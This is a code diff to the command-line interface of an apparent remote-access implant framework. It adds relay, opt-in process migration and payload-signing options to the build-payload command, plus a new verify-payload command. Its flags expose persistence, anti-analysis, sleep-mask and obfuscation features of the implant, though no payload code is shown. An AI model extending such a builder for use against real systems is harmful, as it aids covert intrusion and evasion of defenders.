@@ -202,7 +202,8 @@ def _cmd_build_payload(args: argparse.Namespace) -> int:
         jitter=args.jitter,
         persistence=args.persistence,
         screenshot=args.screenshot,
-        migration=not args.no_migration,
+        migration=args.migration,
+        relay=args.relay,
         anti_analysis=args.anti_analysis,
         sleep_mask=args.sleep_mask,
         obfuscation=args.obfuscation,
@@ -243,6 +244,17 @@ def _cmd_build_payload(args: argparse.Namespace) -> int:
         )
         return 1
     return 0
+
+
+def _cmd_verify_payload(args: argparse.Namespace) -> int:
+    """Check an artifact against the signature its build wrote."""
+    from pupyteer.payloads.manager import PayloadSigner
+
+    config = ConfigManager(args.config, environment=args.environment)
+    signer = PayloadSigner(config, AuditLogger(config))
+    ok, message = signer.verify(args.artifact, getattr(args, "sig", None))
+    print(("OK  " if ok else "FAIL ") + message)
+    return 0 if ok else 1
 
 
 def _cmd_server_info(args: argparse.Namespace) -> int:
@@ -323,13 +335,14 @@ def add_subcommands(parser: argparse.ArgumentParser) -> None:
     p_build.add_argument("--version", default="1.0.0", help="Payload version string")
     p_build.add_argument("--persistence", action="store_true", help="Enable persistence (off by default)")
     p_build.add_argument("--screenshot", action="store_true", help="Compile in screen capture")
-    p_build.add_argument("--no-migration", action="store_true", help="Omit process migration")
+    p_build.add_argument("--migration", action="store_true", help="Compile in the process-migration handlers (off by default; they report a partial step, not a completed migration)")
+    p_build.add_argument("--relay", action="store_true", help="Compile in the peer-to-peer relay listener (off by default)")
     p_build.add_argument("--anti-analysis", action="store_true", help="Compile in VM/sandbox detection (off by default)")
     p_build.add_argument("--sleep-mask", action="store_true", help="Mask the last command output in memory while the agent sleeps (off by default)")
     p_build.add_argument("--obfuscation", choices=["none", "light", "medium", "heavy"], default=None,
                          help="Source-level obfuscation level (default: none)")
     p_build.add_argument("--rc4-key", default="", help="RC4 transport key (empty = plaintext wire)")
-    p_build.add_argument("--sign", action="store_true", help="Sign the artifact if signing is configured")
+    p_build.add_argument("--sign", action="store_true", help="Sign the artifact with Ed25519 (generates a key on first use)")
     p_build.add_argument("--dry-run", action="store_true",
                          help="Validate the config and print it; compile nothing")
     p_build.set_defaults(func=_cmd_build_payload)
@@ -340,6 +353,14 @@ def add_subcommands(parser: argparse.ArgumentParser) -> None:
     _common(p_srv)
     p_srv.add_argument("--reveal", action="store_true", help="Do not redact secret-bearing keys")
     p_srv.set_defaults(func=_cmd_server_info)
+
+    p_verify = sub.add_parser(
+        "verify-payload", help="Verify an artifact against its build signature"
+    )
+    _common(p_verify)
+    p_verify.add_argument("artifact", help="Path to the built payload")
+    p_verify.add_argument("--sig", default=None, help="Signature file (default: <artifact>.sig)")
+    p_verify.set_defaults(func=_cmd_verify_payload)
 
 
 def run_cli(argv: Optional[List[str]] = None) -> Optional[int]:
